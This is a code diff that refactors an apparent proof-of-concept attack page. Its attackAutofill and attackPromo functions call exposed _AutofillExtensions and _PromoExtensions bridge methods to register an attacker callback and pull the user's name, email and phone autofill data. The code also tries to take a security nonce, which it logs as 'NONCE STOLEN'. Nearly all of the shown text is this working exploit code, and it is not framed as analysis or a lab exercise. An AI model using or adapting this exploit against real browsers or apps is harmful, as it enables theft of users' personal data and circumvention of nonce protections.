@@ -38,40 +38,77 @@
         };
 
         function attackAutofill() {
-            if (!window._AutofillExtensions) { log("Error: _AutofillExtensions not found."); return; }
+            if (!window._AutofillExtensions) {
+                log("Error: _AutofillExtensions not found.");
+                return;
+            }
+        
             try {
-                let initPayload = JSON.stringify({"callbackID": "attackerCallback", "name": "attackerCallback"});
-                window._AutofillExtensions.initializeCallbackHandler(initPayload);
-                
-                let requestPayload = JSON.stringify({
-                    "callbackID": "attackerCallback",
-                    "name": "attackerCallback",
-                    "request_id": "1337",
-                    "autofillFields": "NAME,EMAIL,PHONE", 
-                    "requested_fields": ["NAME", "EMAIL", "PHONE"]
+                const initPayload = JSON.stringify({
+                    callbackID: "attackerCallback",
+                    name: "attackerCallback"
                 });
-                window._AutofillExtensions.requestAutoFill(requestPayload);
-                window._AutofillExtensions.autofillAppliedStatusesV2(requestPayload);
-                window._AutofillExtensions.formSubmitted(requestPayload);
-                window._AutofillExtensions.getNonce(requestPayload);
-                window._AutofillExtensions.initializeCallbackHandler(requestPayload);
-                window._AutofillExtensions.proactivePromptsContactAutofillData(requestPayload);
-                window._AutofillExtensions.saveAutofillData(requestPayload);
-                window._AutofillExtensions.selectedContactFieldTag(requestPayload);
+                window._AutofillExtensions.initializeCallbackHandler(initPayload);
+        
+                const requestPayload = JSON.stringify({
+                    callbackID: "attackerCallback",
+                    name: "attackerCallback",
+                    request_id: "1337",
+                    autofillFields: "NAME,EMAIL,PHONE",
+                    requested_fields: ["NAME", "EMAIL", "PHONE"]
+                });
+        
+                const methods = [
+                    "requestAutoFill",
+                    "autofillAppliedStatusesV2",
+                    "formSubmitted",
+                    "getNonce",
+                    "initializeCallbackHandler",
+                    "proactivePromptsContactAutofillData",
+                    "saveAutofillData",
+                    "selectedContactFieldTag"
+                ];
+        
+                for (const method of methods) {
+                    if (typeof window._AutofillExtensions[method] === "function") {
+                        window._AutofillExtensions[method](requestPayload);
+                    } else {
+                        log(`Warning: ${method} is not a function.`);
+                    }
+                }
+        
                 log("requestAutoFill executed! Check for prompt.");
-            } catch (e) { log("Execution Failed: " + e.message); }
+            } catch (e) {
+                log("Execution Failed: " + e.message);
+            }
         }
-
         function attackPromo() {
-            if (!window._PromoExtensions) { log("Error: _PromoExtensions not found."); return; }
+            if (!window._PromoExtensions) {
+                log("Error: _PromoExtensions not found.");
+                return;
+            }
+        
             try {
-                // Since we know they like JSON, let's pass a JSON string
-                let payload = JSON.stringify({"callbackID": "attackerCallback"});
-                let nonce = window._PromoExtensions.getPromoExtensionNonce(payload);
-                let nonce = window._PromoExtensions.initializePromoExtensionCallbackHandler(payload);
-                let nonce = window._PromoExtensions.requestPromoExtensionPromoCodeAutofill(payload);
-                let nonce = window._PromoExtensions.sendPromoExtensionPromoCodeAutofillResult(payload);
-                log("<span style='color:red;'><b>🚨 NONCE STOLEN:</b></span> " + nonce);
+                const payload = JSON.stringify({ callbackID: "attackerCallback" });
+        
+                const methods = [
+                    "getPromoExtensionNonce",
+                    "initializePromoExtensionCallbackHandler",
+                    "requestPromoExtensionPromoCodeAutofill",
+                    "sendPromoExtensionPromoCodeAutofillResult"
+                ];
+        
+                let lastResult = null;
+        
+                for (const method of methods) {
+                    if (typeof window._PromoExtensions[method] === "function") {
+                        lastResult = window._PromoExtensions[method](payload);
+                    } else {
+                        log(`Warning: ${method} is not a function.`);
+                    }
+                }
+        
+                log("<span style='color:red;'><b>🚨 NONCE STOLEN:</b></span> " + lastResult);
             } catch (e) {
                 log("Promo Failed: " + e.message);
             }
